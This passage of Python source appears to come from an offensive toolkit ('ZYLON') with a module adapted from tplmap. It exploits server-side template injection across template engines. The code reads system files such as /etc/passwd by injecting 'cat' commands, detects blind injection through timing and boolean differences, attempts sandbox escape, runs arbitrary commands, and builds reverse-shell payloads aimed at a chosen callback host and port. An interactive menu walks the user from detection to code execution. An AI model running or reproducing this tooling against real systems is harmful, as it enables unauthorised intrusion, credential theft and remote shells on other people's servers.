            return {'vulnerable': False, 'findings': [], 'details': {'error': f'Unknown engine: {engine}'}, 'scan_type': 'ssti_file_read'}

        self._log(f"Reading file {file_path} via {engine} SSTI", "info")
        results = {
            'vulnerable': False,
            'findings': [],
            'details': {
                'engine': engine,
                'file_path': file_path,
                'content': None,
            },
            'scan_type': 'ssti_file_read',
        }

        file_payloads = TEMPLATE_ENGINES[engine].get('file_read_payloads', [])
        if not file_payloads:
            # Fallback: use RCE payloads with cat command
            rce_payloads = TEMPLATE_ENGINES[engine].get('rce_payloads', [])
            file_payloads = [p.replace('{cmd}', 'cat {filepath}') for p in rce_payloads]

        param_name = param or self.injectable_param or 'q'

        for payload_template in file_payloads:
            try:
                cmd_b64 = base64.b64encode(f'cat {file_path}'.encode()).decode()
                payload = payload_template.format(
                    cmd=f'cat {file_path}',
                    cmd_b64=cmd_b64,
                    filepath=file_path,
                )
            except (KeyError, IndexError):
                payload = payload_template

            resp = self._inject_payload(url, param_name, payload, 'query')
            if not resp:
                continue

            # Check for file content indicators
            content = self._extract_file_content(resp.text, file_path)
            if content:
                results['vulnerable'] = True
                results['findings'].append({
                    'type': 'file_read',
                    'engine': engine,
                    'file_path': file_path,
                    'content': content[:500],
                    'param': param_name,
                })
                results['details']['content'] = content[:1000]
                self._log(f"File read successful! Content length: {len(content)}", "success")
                return results

        if not results['vulnerable']:
            self._log("File read not confirmed", "warning")

        return results

    # ========================================================================
    # blind_ssti_detect
    # ========================================================================

    def blind_ssti_detect(self, url, param=None):
        """
        Blind SSTI detection using time-based and boolean-based techniques.
        """
        self._log(f"Blind SSTI detection on {url}", "info")
        results = {
            'vulnerable': False,
            'findings': [],
            'details': {
                'technique': None,
                'engine': None,
                'delay_confirmed': False,
            },
            'scan_type': 'ssti_blind_detect',
        }

        self._get_baseline(url, param)
        injection_points = self._get_injection_points(url, param)
        delay = 5  # seconds

        # Phase 1: Time-based blind detection
        self._log("Phase 1: Time-based blind SSTI detection...", "info")
        for p_name, p_val, inject_type in injection_points:
            for engine_name, time_payloads in BLIND_SSTI_TIME_PAYLOADS.items():
                for payload_template in time_payloads:
                    try:
                        payload = payload_template.format(delay=delay)
                    except (KeyError, IndexError):
                        payload = payload_template

                    start = time.time()
                    resp = self._inject_payload(url, p_name, payload, inject_type)
                    elapsed = time.time() - start

                    if elapsed >= (delay - 1):
                        # Verify with second request
                        start2 = time.time()
                        resp2 = self._inject_payload(url, p_name, payload, inject_type)
                        elapsed2 = time.time() - start2

                        if elapsed2 >= (delay - 1):
                            results['vulnerable'] = True
                            results['findings'].append({
                                'type': 'blind_ssti_time',
                                'engine': engine_name,
                                'param': p_name,
                                'payload': payload[:100],
                                'delay_expected': delay,
                                'delay_actual': round(elapsed, 2),
                                'evidence': f'Consistent time delay: {elapsed:.2f}s, {elapsed2:.2f}s',
                            })
                            results['details']['technique'] = 'time_based'
                            results['details']['engine'] = engine_name
                            results['details']['delay_confirmed'] = True
                            self.detected_engine = engine_name
                            self.injectable_param = p_name
                            self._log(f"Blind SSTI detected (time-based)! Engine: {engine_name}", "success")
                            return results

        # Phase 2: Boolean-based blind detection
        self._log("Phase 2: Boolean-based blind SSTI detection...", "info")
        for p_name, p_val, inject_type in injection_points:
            for engine_name, bool_payloads in BLIND_SSTI_BOOLEAN_PAYLOADS.items():
                if len(bool_payloads) < 2:
                    continue
                true_payload, true_marker = bool_payloads[0]
                false_payload, false_marker = bool_payloads[1] if len(bool_payloads) > 1 else (bool_payloads[0][0], 'X')

                resp_true = self._inject_payload(url, p_name, true_payload, inject_type)
                resp_false = self._inject_payload(url, p_name, false_payload, inject_type)

                if resp_true and resp_false:
                    true_has = true_marker in resp_true.text
                    false_has = true_marker in resp_false.text
                    if true_has and not false_has:
                        results['vulnerable'] = True
                        results['findings'].append({
                            'type': 'blind_ssti_boolean',
                            'engine': engine_name,
                            'param': p_name,
                            'true_payload': true_payload,
                            'false_payload': false_payload,
                            'evidence': f'Boolean diff: "{true_marker}" in true response, not in false',
                        })
                        results['details']['technique'] = 'boolean_based'
                        results['details']['engine'] = engine_name
                        self.detected_engine = engine_name
                        self.injectable_param = p_name
                        self._log(f"Blind SSTI detected (boolean-based)! Engine: {engine_name}", "success")
                        return results

        self._log("No blind SSTI vulnerability detected", "warning")
        return results

    # ========================================================================
    # generate_reverse_shell
    # ========================================================================

    def generate_reverse_shell(self, url, param=None, host=None, port=4444, engine=None):
        """
        Generate reverse shell via SSTI.
        """
        engine = engine or self.detected_engine
        if not engine:
            return {'vulnerable': False, 'findings': [], 'details': {'error': 'No engine specified'}, 'scan_type': 'ssti_reverse_shell'}

        if engine not in TEMPLATE_ENGINES:
            return {'vulnerable': False, 'findings': [], 'details': {'error': f'Unknown engine: {engine}'}, 'scan_type': 'ssti_reverse_shell'}

        # Use oob_provider for callback host if not explicitly provided
        if host is None:
            oob_pid = oob_provider.generate_payload_id()
            oob_domain = oob_provider.get_callback_domain(oob_pid)
            host = oob_domain

        self._log(f"Generating reverse shell via {engine} SSTI -> {host}:{port}", "info")
        results = {
            'vulnerable': False,
            'findings': [],
            'details': {
                'engine': engine,
                'host': host,
                'port': port,
                'shell_payloads': [],
            },
            'scan_type': 'ssti_reverse_shell',
        }

        rs_payloads = TEMPLATE_ENGINES[engine].get('reverse_shell_payloads', [])
        param_name = param or self.injectable_param or 'q'

        for shell_type, shell_cmd in REVERSE_SHELL_TEMPLATES.items():
            formatted_shell = shell_cmd.format(host=host, port=port)

            for payload_template in rs_payloads:
                try:
                    payload = payload_template.format(
                        cmd=formatted_shell,
                        cmd_b64=base64.b64encode(formatted_shell.encode()).decode(),
                        shell_cmd=formatted_shell,
                        filepath='',
                    )
                except (KeyError, IndexError):
                    continue

                results['details']['shell_payloads'].append({
                    'shell_type': shell_type,
                    'raw_command': formatted_shell,
                    'ssti_payload': payload[:200],
                    'param': param_name,
                })

        if results['details']['shell_payloads']:
            results['vulnerable'] = True
            results['findings'] = results['details']['shell_payloads'][:5]
            self._log(f"Generated {len(results['details']['shell_payloads'])} reverse shell payloads", "success")

        return results

    # ========================================================================
    # Helper methods
    # ========================================================================

    def _extract_command_output(self, text, command):
        """Extract command output from response text"""
        patterns = [
            r'(uid=\d+\([^)]+\)\s+gid=\d+\([^)]+\))',
            r'(root:x:0:0)',
            r'(Linux\s+\S+\s+\d+\.\d+\.\d+)',
            r'(total\s+\d+\n?[drwx-]{10})',
        ]
        for pattern in patterns:
            match = regex_cache.search(pattern, text)
            if match:
                return match.group(0)
        return None

    def _extract_file_content(self, text, file_path):
        """Extract file content from response text"""
        if '/etc/passwd' in file_path:
            match = regex_cache.search(r'(root:x:0:0:[^\n]*\n(?:[^\n]*:\d+:\d+:[^\n]*\n?)*)', text)
            if match:
                return match.group(0)
        # Generic: look for multi-line content that doesn't look like HTML
        if 'root:' in text or '#!' in text or 'export ' in text:
            lines = text.split('\n')
            content_lines = [l for l in lines if not l.strip().startswith('<') and not l.strip().startswith('{')]
            if len(content_lines) > 3:
                return '\n'.join(content_lines[:20])
        return None


# ============================================================================
# MODULE-LEVEL run() FUNCTION (Required by ZYLON)
# ============================================================================

def run(target, scan_type='detect', **kwargs):
    """
    Main entry point for ZYLON integration.

    Args:
        target: Target URL
        scan_type: One of 'detect', 'identify', 'sandbox_escape', 'exec_code',
                   'file_read', 'blind_detect', 'reverse_shell'
        **kwargs: Additional arguments (param, engine, code, filepath, host, port)

    Returns:
        dict: Results with 'vulnerable', 'findings', 'details', 'scan_type'
    """
    engine = TPLmapEngine(
        timeout=kwargs.get('timeout', 10),
        retries=kwargs.get('retries', 2),
        threads=kwargs.get('threads', 5),
        verbose=kwargs.get('verbose', True),
        proxy=kwargs.get('proxy', None),
    )

    param = kwargs.get('param', None)

    if scan_type == 'detect':
        return engine.detect_ssti(target, param=param)
    elif scan_type == 'identify':
        return engine.identify_engine(target, param=param)
    elif scan_type == 'sandbox_escape':
        return engine.sandbox_escape(target, param=param, engine=kwargs.get('engine'))
    elif scan_type == 'exec_code':
        return engine.execute_code(target, param=param, code=kwargs.get('code', 'id'), engine=kwargs.get('engine'))
    elif scan_type == 'file_read':
        return engine.read_file(target, param=param, file_path=kwargs.get('filepath', '/etc/passwd'), engine=kwargs.get('engine'))
    elif scan_type == 'blind_detect':
        return engine.blind_ssti_detect(target, param=param)
    elif scan_type == 'reverse_shell':
        return engine.generate_reverse_shell(target, param=param, host=kwargs.get('host', None), port=kwargs.get('port', 4444), engine=kwargs.get('engine'))
    else:
        # Default: run full detection
        result = engine.detect_ssti(target, param=param)
        if result.get('vulnerable') and result.get('details', {}).get('engine'):
            detected_engine = result['details']['engine']
            # Try sandbox escape
            escape_result = engine.sandbox_escape(target, param=param, engine=detected_engine)
            result['details']['sandbox_escape'] = escape_result
            # Try code execution
            if escape_result.get('vulnerable'):
                exec_result = engine.execute_code(target, param=param, code='id', engine=detected_engine)
                result['details']['code_execution'] = exec_result
        return result


# ============================================================================
# CONSOLE INTERFACE (Standalone mode)
# ============================================================================

def run_tplmap_scan(console=None):
    """Interactive TPLmap scan for ZYLON menu"""
    if console is None:
        from rich.console import Console
        console = Console()

    from rich.panel import Panel
    from rich.table import Table
    from rich.prompt import Prompt

    console.print(Panel(
        "[bold cyan]TPLmap ENGINE (Advanced SSTI Detection & Exploitation)[/bold cyan]\n"
        "[yellow]Fused from: epinna/tplmap | 11 Template Engines[/yellow]\n"
        "[green]Engines: Jinja2, Twig, Mako, Tornado, Freemarker, Velocity,\n"
        "         Thymeleaf, Pug/Jade, ERB, Dust, Handlebars[/green]\n"
        "[magenta]Features: Sandbox Escape, Blind SSTI, File Read, Reverse Shell[/magenta]",
        border_style="bright_cyan"
    ))

    url = Prompt.ask("[cyan]Enter target URL[/cyan]")
    if not url.strip():
        console.print("[red][-] No URL provided![/red]")
        return

    param = Prompt.ask("[cyan]Parameter to test (leave blank for auto)[/cyan]", default="")
    param = param.strip() if param.strip() else None

    engine = TPLmapEngine(timeout=15, verbose=True)

    console.print("\n[cyan][*] Phase 1: SSTI Detection (TPLmap)...[/cyan]")

    with console.status("[bold green]Testing SSTI with TPLmap payloads across 11 engines...", spinner="dots"):
        detection = engine.detect_ssti(url.strip(), param=param)

    if detection.get('vulnerable'):
        detected = detection['details'].get('engine', 'Unknown')
        console.print(f"\n[bold green][+] SSTI DETECTED! Engine: {detected}[/bold green]")

        for i, finding in enumerate(detection.get('findings', []), 1):
            table = Table(title=f"SSTI Finding #{i}", box=None, show_header=False)
            table.add_column("Key", style="cyan", width=15)
            table.add_column("Value", style="green")
            table.add_row("Engine", finding.get('engine', 'Unknown'))
            table.add_row("Parameter", finding.get('param', 'Unknown'))
            table.add_row("Detection", finding.get('evidence', ''))
            table.add_row("Payload", finding.get('payload', '')[:100])
            console.print(table)
            console.print()

        # Phase 2: Sandbox escape
        exploit_choice = Prompt.ask("[cyan]Try sandbox escape?[/cyan]", choices=["y", "n"], default="y")
        if exploit_choice == 'y':
            with console.status("[bold green]Attempting sandbox escape...", spinner="dots"):
                escape = engine.sandbox_escape(url.strip(), param=param, engine=detected)
            if escape.get('vulnerable'):
                console.print("[bold green][+] SANDBOX ESCAPED![/bold green]")
            else:
                console.print("[yellow][-] Sandbox escape not confirmed[/yellow]")

        # Phase 3: Code execution
        exec_choice = Prompt.ask("[cyan]Try code execution?[/cyan]", choices=["y", "n"], default="n")
        if exec_choice == 'y':
            cmd = Prompt.ask("[cyan]Command to execute[/cyan]", default="id")
            with console.status("[bold green]Executing code...", spinner="dots"):
                exec_result = engine.execute_code(url.strip(), param=param, code=cmd, engine=detected)
            if exec_result.get('vulnerable'):
                console.print(f"[bold green][+] Output:[/bold green] {exec_result.get('details', {}).get('output', 'No output')[:200]}")
            else:
                console.print("[yellow][-] Code execution not confirmed[/yellow]")
    else:
        console.print("\n[yellow][-] No SSTI vulnerabilities detected with TPLmap.[/yellow]")
        console.print("[cyan][*] Try blind SSTI detection or different parameters.[/cyan]")


if __name__ == "__main__":
    run_tplmap_scan()
